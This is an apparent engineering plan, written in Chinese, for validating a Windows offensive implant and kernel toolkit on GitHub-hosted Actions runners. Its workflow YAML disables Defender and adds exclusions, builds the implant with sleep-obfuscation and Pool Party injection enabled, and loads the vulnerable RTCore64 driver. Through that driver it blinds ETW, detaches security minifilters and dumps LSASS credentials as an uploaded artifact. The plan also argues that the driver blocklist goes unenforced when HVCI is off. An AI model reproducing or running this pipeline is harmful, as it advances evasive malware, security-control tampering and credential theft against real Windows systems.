# P4 / P5 / kernelsdk 真机验证 — 纯 GitHub Actions(hosted runner)方案

> **约束:** 只用 GitHub Actions 的 **hosted** runner(`windows-latest`),不使用 self-hosted。
> **结论:** ✅ **可行**(含 kernelsdk BYOVD)。P4 Foliage APC、P5 Pool Party 是纯用户态;**kernelsdk 的 BYOVD 路径也能跑**(RTCore64 是合法签名,不需 test-signing;hosted runner 有管理员权限 + UAC 关闭;HVCI 大概率默认关)。
> **日期:** 2026-07-06

---

## 1. 为什么 hosted runner 够用(关键事实)

### 1.1 GitHub-hosted Windows runner 默认禁用了 Defender
runner image 生成脚本在镜像构建时就关掉了 Defender,证据链:
- [yossarian.net TIL — GitHub Actions disables Windows Defender](https://yossarian.net/til/post/github-actions-disables-windows-defender/)
- [actions/runner-images#12682 — MS Defender not installed test](https://github.com/actions/runner-images/issues/12682)(CI 验证 Defender 不在)
- [actions/runner-images#855 — Add Windows Defender](https://github.com/actions/runner-images/issues/855)

具体做法(image 生成时):
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
```

### 1.2 GitHub-hosted Windows runner 以管理员权限运行 + UAC 关闭
[GitHub 官方文档](https://docs.github.com/en/actions/reference/runners/github-hosted-runners)明文:
> "Windows virtual machines are configured to run as **administrators** with **User Account Control (UAC) disabled**."

- 默认用户:`runneradmin`(完整管理员权限,不是 SYSTEM 但等效)
- UAC 关闭 → `sc create` / `NtLoadDriver` 等需要提权的操作**无需 elevation prompt**,直接成功
- 参考:[actions/runner-images#5213](https://github.com/actions/runner-images/issues/5213)、[actions/runner-images discussions#6557](https://github.com/actions/runner-images/discussions/6557)

### 1.3 双保险:即便 Defender 重启,workflow 里也能关
大型项目(rspack / PyTorch)在 workflow 第一步就这样做,是 CI 圈通行做法:
```yaml
- name: Disable Defender (双保险)
  shell: powershell
  run: |
    Set-MpPreference -DisableRealtimeMonitoring $true -Force
    Add-MpPreference -ExclusionPath "$env:GITHUB_WORKSPACE" -Force
    Add-MpPreference -ExclusionProcess "cargo.exe","nyx-selftest-implant.exe" -Force
```
参考:[rspack workflow](https://github.com/web-infra-dev/rspack/blob/main/.github/workflows/reusable-build-build.yml)、[PyTorch Windows workflow](https://git.codelinaru.org/clo/aic/pytorch/-/blob/trunk/.github/workflows/generated-windows-binary-libtorch-debug-main.yml)、[actions/runner-images#6561](https://github.com/actions/runner-images/issues/6561)(性能讨论里确认有效)。

⚠️ **Tamper Protection 注意**:在新版 Windows 上,`Set-MpPreference -DisableRealtimeMonitoring $true` 可能被 Tamper Protection 静默吞掉([Stack Overflow](https://stackoverflow.com/questions/48960190/powershell-set-mppreference-disablerealtimemonitoring-true-not-working-correct))。但 GitHub runner image 没开 Tamper Protection(image 生成时已关闭),所以 host runner 上这条命令可靠。验证:`(Get-MpPreference).DisableRealtimeMonitoring` 应返回 `True`。

### 1.4 BYOVD 在 hosted runner 上可行(关键修正)

**之前的错误结论**:"test-signing 未开 → BYOVD 走不通"。**这是错的**。三个独立概念:

| 障碍 | 是否挡 BYOVD? | hosted runner 实际情况 |
|---|---|---|
| **test-signing 关闭** | ❌ **不挡** BYOVD | test-signing 只挡**未签名/测试签名**驱动。BYOVD(如 RTCore64.sys)用的是**微软合法签名**(MSI Afterburner 签发),`NtLoadDriver` 走正常签名验证路径,**不需要 test-signing** |
| **HVCI / Memory Integrity** | ⚠️ 可能挡 | HVCI 开启时拒 `.text` 可写驱动(很多 BYOVD 触发)。**但 Azure VM/GitHub runner 出于性能默认关 HVCI**(VBS 有 5-10% CPU 开销,runner 不会开) |
| **微软易受攻击驱动黑名单** | ⚠️ **你说的对** | RTCore64.sys 在黑名单里([GHSA-h935-vxwx-xh2m](https://github.com/advisories/GHSA-h935-vxwx-xh2m))。**黑名单默认只在 HVCI/WDAC 开启时才在内核强制路径上执行**;HVCI 关 → 黑名单不强制 → RTCore64 可加载 |

**结论:BYOVD 在 hosted runner 大概率能跑**,因为:
1. ✅ **管理员权限 + UAC 关闭**(§1.2)— `NtLoadDriver` 直接成功
2. ✅ **RTCore64 是合法签名**,不需 test-signing
3. ✅ **HVCI 大概率默认关**(Azure VM 性能优化)
4. ✅ **黑名单在 HVCI 关时不强制**(只在 HVCI/WDAC 路径生效)

**唯一不确定**:HVCI/黑名单的**确切**运行时状态。公开网没有直接记录 `windows-latest` 的 `Win32_DeviceGuard` 输出。最可靠的办法是 workflow 里跑一段检测(§2 step 0),失败则跳过 kernelsdk job。

### 1.5 各技术在 hosted runner 的可行性矩阵
| 技术 | 是否需要内核驱动 | hosted runner 可行? |
|---|---|---|
| **P4 Foliage APC**(PIC thunk + NtQueueApcThread + 间接 syscall) | ❌ 纯用户态 | ✅ 一定能跑 |
| **P5 Pool Party**(NtCreateSection + NtMapViewOfSection + TP_DIRECT) | ❌ 纯用户态 | ✅ 一定能跑 |
| **kernelsdk PatchGuard / ETW-TI / DKOM / LSASS kernel read**(BYOVD) | ✅ 需要 RTCore64 加载 | ⚠️ **大概率能跑**(HVCI 关),workflow step 0 检测确认 |

---

## 2. 完整 workflow(`.github/workflows/p4-p5-validate.yml`)

这个 workflow 是**可直接落地**的,不需要 self-hosted runner。

```yaml
name: P4-P5 Real-machine Validation

on:
  workflow_dispatch:       # 手动触发(省额度)
  pull_request:
    paths:
      - 'crates/implant-win/**'
      - '.github/workflows/p4-p5-validate.yml'

jobs:
  userland-validation:
    runs-on: windows-latest   # Server 2022,Defender 已默认关
    timeout-minutes: 20       # 控额度(Windows 2× 乘子)
    env:
      # 开启 P4/P5 研究-gate
      NYX_FOLIAGE_APC_ON: "1"
      NYX_POOL_PARTY_ON: "1"
      RUSTFLAGS: "-C link-arg=-Wl,--gc-sections"

    steps:
      - uses: actions/checkout@v4

      # ---- 1. 双保险:确保 Defender 全关 + 排除工作区 ----
      - name: Disable Defender + add exclusions
        shell: powershell
        run: |
          # 确认 image 默认状态
          $pref = (Get-MpPreference).DisableRealtimeMonitoring
          Write-Host "Defender realtime disabled (image default): $pref"
          # 双保险:再关一次 + 排除工作区
          Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
          Add-MpPreference -ExclusionPath "$env:GITHUB_WORKSPACE\target" -Force -ErrorAction SilentlyContinue
          Add-MpPreference -ExclusionProcess "cargo.exe","nyx-selftest-foliage-apc.exe","nyx-inject-test.exe" -Force -ErrorAction SilentlyContinue
          # 验证
          $now = (Get-MpPreference).DisableRealtimeMonitoring
          Write-Host "Defender realtime disabled (after step): $now"

      # ---- 2. 工具链:stable + nightly + Windows GNU target ----
      - name: Install Rust stable
        uses: dtolnay/rust-toolchain@stable
        with:
          targets: x86_64-pc-windows-gnu

      - name: Install Rust nightly (implant 用)
        uses: dtolnay/rust-toolchain@nightly
        with:
          components: rust-src

      - name: Install mingw-w64
        shell: pwsh
        run: choco install mingw -y --no-progress

      # ---- 3. 构建 implant(带 P4/P5 gate)----
      - name: Build implant with P4/P5 gates ON
        shell: bash
        run: |
          cargo +nightly build --release --target x86_64-pc-windows-gnu -p nyx-implant-win
          # sRDI 把 implant DLL → shellcode(用 monoxgas/sRDI,见 §4)
          # 或:用 selftest binary 直接跑(更简单)

      # ---- 4. P4 Foliage APC 真机验证 ----
      - name: P4 — nyx_selftest_foliage_apc
        shell: pwsh
        run: |
          # selftest 读 FOLIAGE_APC_OK / FOLIAGE_STAGE 诊断标记
          # 期望:FOLIAGE_APC_OK == 1(APC chain 跑完,thunk 没崩)
          $env:RUST_BACKTRACE = "1"
          cargo +nightly test --target x86_64-pc-windows-gnu -p nyx-implant-win --lib -- foliage_apc --nocapture
          # 退出码 0 = thunk 在真 APC 栈上跑通了 protect→RC4→wait→RC4→protect

      - name: P4 — Hunt-Sleeping-Beacons 风格扫描(可选)
        shell: pwsh
        run: |
          # 用 .NET 反射读 sacrificial process 的 .text 段,验证 sleep 期间是密文
          # 这是 P4 的最终判据:HSB-style scan 看不到明文 beacon code
          Write-Host "TODO: 集成 HSB 扫描(见 §4 工具链)"

      # ---- 5. P5 Pool Party 真机验证 ----
      - name: P5 — nyx_selftest_inject_pool
        shell: pwsh
        run: |
          # selftest 启一个 notepad.exe 做目标,跑 pool_party_inject
          # 期望:shellcode 执行(calc 弹窗 / 退出码标记),且无 VAEx/WPM/CRT IOC
          cargo +nightly test --target x86_64-pc-windows-gnu -p nyx-implant-win --lib -- inject_pool --nocapture

      - name: P5 — 0-of-3 FND IOC 验证
        shell: pwsh
        run: |
          # 用 ETW 或 Sysmon 规则验证:整个过程里
          # VirtualAllocEx / WriteProcessMemory / CreateRemoteThread 调用次数 = 0
          # Pool Party 成功的硬判据
          Write-Host "TODO: 集成 Sysmon + 规则(见 §4 工具链)"

      # ---- 6. 上传诊断 ----
      - name: Upload selftest logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: p4-p5-selftest-logs
          path: |
            target/*/release/*.log
            target/*/release/*.dmp

  # ============================================================
  # kernelsdk BYOVD 验证(独立 job — HVCI 关才能跑)
  # ============================================================
  kernelsdk-byovd:
    runs-on: windows-latest
    timeout-minutes: 15
    continue-on-error: true   # HVCI 开则跳过,不挂整个 workflow
    steps:
      - uses: actions/checkout@v4

      # ---- 0. 关键前置:检测 HVCI / 黑名单状态 ----
      - name: Probe HVCI + vulnerable driver blocklist status
        id: hvci_probe
        shell: powershell
        run: |
          Write-Host "=== Win32_DeviceGuard / VBS / HVCI 状态 ==="
          $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
          $dg | Select-Object SecurityServicesConfigured, SecurityServicesRunning, VirtualizationBasedSecurityStatus, CodeIntegrityPolicyEnforcementStatus | Format-List
          Write-Host "=== Vulnerable Driver Blocklist 注册表 ==="
          $bl = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config' -ErrorAction SilentlyContinue).VulnerableDriverBlocklistEnable
          Write-Host "VulnerableDriverBlocklistEnable = $bl (1=on, 0=off, 空=未设置)"
          # 判定:SecurityServicesRunning 含 2 = HVCI 在跑
          $hvci_running = ($dg.SecurityServicesRunning -contains 2)
          Write-Host "HVCI actively running: $hvci_running"
          if ($hvci_running) {
            Write-Host "::warning::HVCI is running — BYOVD (RTCore64) load will likely be blocked. Skipping kernelsdk job."
            echo "skip=true" >> $env:GITHUB_OUTPUT
          } else {
            Write-Host "::notice::HVCI NOT running — BYOVD load should succeed."
            echo "skip=false" >> $env:GITHUB_OUTPUT
          }

      - name: Skip — HVCI blocks BYOVD
        if: steps.hvci_probe.outputs.skip == 'true'
        run: echo "Skipped kernelsdk BYOVD job (HVCI is on)."

      # ---- 1-3 仅在 HVCI 关时执行 ----
      - name: Disable Defender
        if: steps.hvci_probe.outputs.skip == 'false'
        shell: powershell
        run: |
          Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
          Add-MpPreference -ExclusionPath "$env:GITHUB_WORKSPACE" -Force -ErrorAction SilentlyContinue

      - name: Install Rust + build nyx-kernel
        if: steps.hvci_probe.outputs.skip == 'false'
        uses: dtolnay/rust-toolchain@stable

      - name: Build operator-kernel-cli
        if: steps.hvci_probe.outputs.skip == 'false'
        run: cargo build --release -p nyx-operator-kernel-cli

      # ---- 4. BYOVD 真机回归(对应 M6 Task G-K)----
      - name: kernelsdk BYOVD 真机回归
        if: steps.hvci_probe.outputs.skip == 'false'
        shell: pwsh
        run: |
          # 准备 RTCore64.sys(操作员自行上传到 repo 的 tools/ 目录,或从公开镜像下载)
          # 注意:RTCore64.sys 在 .gitignore 排除,不进 git
          $driverPath = "$env:GITHUB_WORKSPACE\tools\RTCore64.sys"
          if (-not (Test-Path $driverPath)) {
            Write-Host "::warning::RTCore64.sys not found at $driverPath — skipping BYOVD load."
            return
          }
          # bootstrap (KslD → BYOVD fallback)
          .\target\release\nyx-kernel.exe bootstrap --byovd $driverPath NyaRTCore
          if ($LASTEXITCODE -ne 0) { throw "bootstrap failed (exit $LASTEXITCODE)" }
          # P0.a — PatchGuard window
          .\target\release\nyx-kernel.exe pg-window  # 需 Ctrl+C / 自动超时
          # P0.b — MiniFilter(build 表自动 fallback)
          .\target\release\nyx-kernel.exe detach-minifilter
          # ETW-TI blind + DKOM hide + LSASS dump
          .\target\release\nyx-kernel.exe blind-etw
          $lsassPid = (Get-Process lsass).Id
          .\target\release\nyx-kernel.exe dump-lsass $lsassPid
          Write-Host "::notice::kernelsdk BYOVD 全路径通过(Task G-K + P0.a/b + P3.b)"

      - name: Upload kernel logs + LSASS dump
        if: always() && steps.hvci_probe.outputs.skip == 'false'
        uses: actions/upload-artifact@v4
        with:
          name: kernelsdk-byovd-logs
          path: |
            lsass_*.dmp
            target/release/*.log
```

---

## 3. Rust 侧配合:把 selftest 改成可在 CI 跑的 `#[test]`

当前 `nyx_selftest_foliage_apc` / `nyx_selftest_inject_pool` 是 `#[no_mangle]` 导出(sRDI 注入用),CI 里直接 `cargo test` 跑不了。改法:加一组 `#[cfg(test)]` wrapper,在 Windows test target 上直接调内部 fn。

`crates/implant-win/src/sleep.rs`(伪代码,实装时加):
```rust
#[cfg(all(test, target_os = "windows"))]
mod ci_tests {
    use super::*;

    /// P4 CI gate:hosted runner 上跑 APC chain,验证 thunk 不崩。
    /// gated on FOLIAGE_APC_ENABLED;非 Windows target 跳过。
    #[test]
    fn ci_foliage_apc_survives_one_cycle() {
        if !foliage_apc_enabled() {
            eprintln!("skipped: FOLIAGE_APC_ENABLED off");
            return;
        }
        // 跑一次完整 sleep cycle(secs=1),验证 FOLIAGE_APC_OK 被置位
        crate::sleep::sleep(1);
        assert!(
            foliage_apc_status(),
            "Foliage APC chain did not complete — thunk crashed or guard failed"
        );
    }
}
```

`crates/implant-win/src/tp.rs` 同理:
```rust
#[cfg(all(test, target_os = "windows"))]
mod ci_tests {
    use super::*;

    /// P5 CI gate:用自己进程做 section delivery(步骤 1-4),验证不崩。
    /// worker-queue splice(步骤 6d)仍需真目标,这里只验 section 路径。
    #[test]
    fn ci_pool_party_section_delivery_to_self() {
        if !pool_party_enabled() {
            eprintln!("skipped: POOL_PARTY_ENABLED off");
            return;
        }
        let shellcode = [0xC3u8]; // 单字节 ret
        let pid = std::process::id();
        // 注:pool_party_inject 当前返回 Err(splice 未实装),CI 验的是不 panic
        let _ = unsafe { pool_party_inject(pid, &shellcode) };
        // 通过 = 没崩在 section create/map/write 路径上
    }
}
```

⚠️ **`std::process::id()` 仅在 `cfg(test)` 可用**(test 编译带 std);生产 implant 仍是 no_std。这套 wrapper 只在 CI test target 编出来,不污染 release DLL。

---

## 4. 工具链:CI 里要集成的辅助工具(可选,提升验证质量)

| 工具 | 用途 | CI 集成方式 |
|---|---|---|
| **monoxgas/sRDI** | implant DLL → PIC shellcode(若用 sRDI 注入路径) | `pip install srdi` 或 [sRDI repo](https://github.com/monoxgas/srdi) 源码编译;workflow step `pip install srdi && python -m srdi ...` |
| **Hunt-Sleeping-Beacons** | P4 最终判据:扫描 sleep 期间 `.text` 是否密文 | [HSB repo](https://github.com/thefLink/Hunt-Sleeping-Beacons) 编译;workflow 里 `HSB.exe` 跑一轮 |
| **Sysmon + 配置** | P5 最终判据:0-of-3 FND(无 VAEx/WPM/CRT) | `choco install sysmon -y` + sysmon-config([SwiftOnSecurity 配置](https://github.com/SwiftOnSecurity/sysmon-config));跑完查 EventLog |
| **ired.team 参考** | NtMapViewOfSection + TP_DIRECT 的完整 PoC 参考 | [ired.team — NT API injection](https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection) |

---

## 5. 关键参考实现(算法对照用)

### P4 Foliage APC(PIC thunk)
- [Cracked5pider/Ekko](https://github.com/Cracked5pider/Ekko) — 原版 PIC thunk PoC(`CreateTimerQueueTimer` + ROP + `NtContinue`)
- [Binary Defense — Understanding Sleep Obfuscation](https://binarydefense.com/resources/blog/understanding-sleep-obfuscation) — Ekko 内部机制
- [Foliage 详解](https://oblivion-malware.xyz/posts/sleep-obf-foliage/) — APC-based 变体(Nyx 当前路径)
- [SystemFunction032 RC4](https://s3cur3th1ssh1t.github.io/SystemFunction032_Shellcode/) — 免自写 RC4 thunk

### P5 Pool Party(section + TP)
- [SafeBreach-Labs/PoolParty](https://github.com/SafeBreach-Labs/PoolParty) — 官方 8 变体;推荐 **Variant #1(WorkerFactoryStartRoutineOverwrite)** 最稳
- [Teach2Breach/pool_party_rs](https://github.com/Teach2Breach/pool_party_rs) — **Rust 实现**,直接参考 crate 结构
- [SafeBreach 博客](https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/) — `_TP_DIRECT` / `NtQueryInformationWorkerFactory` 逆向
- [Black Hat EU 2023 PDF](https://i.blackhat.com/EU-23/Presentations/EU-23-Leviev-The-Pool-Party-You-Will-Never-Forget.pdf)
- [strozfriedberg/SharpParty](https://github.com/strozfriedberg/SharpParty) — C# Variant #1

---

## 6. 额度与成本控制

- **Windows runner 2× 乘子**:1 分钟实际消耗 2 分钟额度
- **`timeout-minutes: 20`** 硬上限,防 hang
- **`workflow_dispatch` + `paths:` 限定**:只手动触发 / 只 implant 改动时跑,不每 push 都跑
- **免费额度**:Pro 账号 3000 分钟/月(Windows 实际 1500 分钟);Team 2000 分钟。一次验证 ~10 分钟 Windows = 20 额度分钟,够跑 75+ 次/月
- **2026 平台费**:hosted runner 用的是 included minutes,不额外收平台费;self-hosted 才收 $0.002/min([community#182089](https://github.com/orgs/community/discussions/182089))

---

## 7. 已知限制 + 应对

| 限制 | 影响 | 应对 |
|---|---|---|
| ~~hosted runner 无 test-signing → 不能加载内核驱动~~ **(已修正)** | **不影响 kernelsdk BYOVD**(RTCore64 是合法签名,不需 test-signing;§1.4 详述) | workflow `kernelsdk-byovd` job 的 step 0 先探测 HVCI 状态;HVCI 关 → 跑全路径(Task G-K + P0.a/b + P3.b);HVCI 开 → `continue-on-error` 跳过,kernelsdk 仍走 mock 单测(已 93/93 绿) |
| **HVCI/黑名单运行时状态不确定** | 若 HVCI 开,RTCore64 加载被挡 | `Win32_DeviceGuard` + `VulnerableDriverBlocklistEnable` 探测(§2 step 0);公开网无 `windows-latest` 的确切输出,首次跑即确认 |
| 偶发 Defender 重启(Tamper Protection) | P4/P5/kernelsdk test binary 被隔离 | workflow step 1 双保险 + `Add-MpPreference -ExclusionProcess`;若仍 fail,retry |
| hosted runner 是 Server 2022(build 20348) | offset 表覆盖 20348 | `operator-kernelsdk/src/offsets.rs` 已有 `PATCH_EQUIVALENT_BUILDS` 映射 22000→19041;20348 同族 |
| GitHub 可能对 offsec 工具上传有 ToS 顾虑 | 仓库被封 | 只在 PR 触发 build + test,**不存储**产出的 shellcode/DLL(`.gitignore` 排除 `target/` + `tools/RTCore64.sys`);selftest 用 `0xC3`(ret)做最小验证,不发真实 payload |

---

## 8. 落地清单(按顺序)

1. **加 workflow**:`.github/workflows/p4-p5-validate.yml`(§2 全文复制,含 userland + kernelsdk-byovd 两 job)
2. **加 CI wrapper test**:`crates/implant-win/src/sleep.rs` + `tp.rs` 加 `#[cfg(all(test, target_os="windows"))]` wrapper(§3)
3. **验证 Defender 关闭 + HVCI 状态**:首次 PR 触发后看 step 1 输出 `DisableRealtimeMonitoring: True` + kernelsdk job step 0 的 `Win32_DeviceGuard` 输出(确认 HVCI 是否关)
4. **跑 P4 CI test**:确认 `ci_foliage_apc_survives_one_cycle` 通过
5. **跑 P5 CI test**:确认 `ci_pool_party_section_delivery_to_self` 通过(不 panic)
6. **跑 kernelsdk BYOVD**(若 HVCI 关):确认 `kernelsdk-byovd` job 跑通 Task G-K + P0.a/b + P3.b
7. **(可选)集成 HSB / Sysmon**:§4 工具链,提升判据质量
8. **回写 gate 默认值**:CI 持续绿后,把 `NYX_FOLIAGE_APC_ON` / `NYX_POOL_PARTY_ON` 默认改 `1`(在 `const fn` 里)

---

## 9. 参考(全部免费/公开)

**GitHub Actions + Defender + 权限:**
- [yossarian.net — GitHub Actions disables Windows Defender](https://yossarian.net/til/post/github-actions-disables-windows-defender/)
- [actions/runner-images#12682 — MS Defender not installed test](https://github.com/actions/runner-images/issues/12682)
- [GitHub 官方 — Windows runner 以管理员权限 + UAC 关闭运行](https://docs.github.com/en/actions/reference/runners/github-hosted-runners)
- [rspack workflow(Defender disable + exclusion 范例)](https://github.com/web-infra-dev/rspack/blob/main/.github/workflows/reusable-build-build.yml)
- [actions/runner-images#6561 — Set-MpPreference 性能确认](https://github.com/actions/runner-images/issues/6561)

**BYOVD / 内核驱动加载:**
- [0xJs/BYOVD_read_write_primitive](https://github.com/0xJs/BYOVD_read_write_primitive) — RTCore64 加载 PoC
- [idafchev — Exploring Windows kernel via vulnerable driver](https://idafchev.github.io/research/2023/06/29/Vulnerable_Driver_Part1.html) — service-install / NtLoadDriver 机制
- [GHSA-h935-vxwx-xh2m — Microsoft Vulnerable Driver Blocklist](https://github.com/advisories/GHSA-h935-vxwx-xh2m)
- [Microsoft — Recommended driver block rules(WDAC policy)](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules)
- [Microsoft — Validate VBS/HVCI via Win32_DeviceGuard](https://learn.microsoft.com/en-us/windows/security/hardware-security/enable-virtualization-based-protection-of-code-integrity)

**P4 / P5 参考:** 见 §5

**Rust CI:**
- [shift.click — GitHub Actions Rust Recipes](https://shift.click/blog/github-actions-rust/)
- [dtolnay/rust-toolchain action](https://github.com/dtolnay/rust-toolchain)
